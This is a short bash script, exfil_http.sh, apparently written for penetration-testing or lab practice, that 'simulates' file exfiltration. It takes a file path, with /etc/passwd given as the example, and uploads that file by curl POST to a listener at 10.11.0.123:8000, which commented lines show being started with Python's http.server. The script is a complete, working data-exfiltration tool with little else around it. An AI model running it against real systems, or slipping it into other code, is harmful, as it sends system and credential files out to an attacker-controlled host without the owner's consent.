#!/bin/bash
# Simulate file exfiltration over HTTP POST
#python3 -m http.server 8000 --bind 0.0.0.0  # On listener
#./exfil_http.sh /etc/passwd

FILE="$1"
DEST="http://10.11.0.123:8000/upload"

if [[ ! -f "$FILE" ]]; then
    echo " File not found: $FILE"
    exit 1
fi

echo " Sending $FILE to $DEST ..."
curl -X POST -F "file=@$FILE" "$DEST"
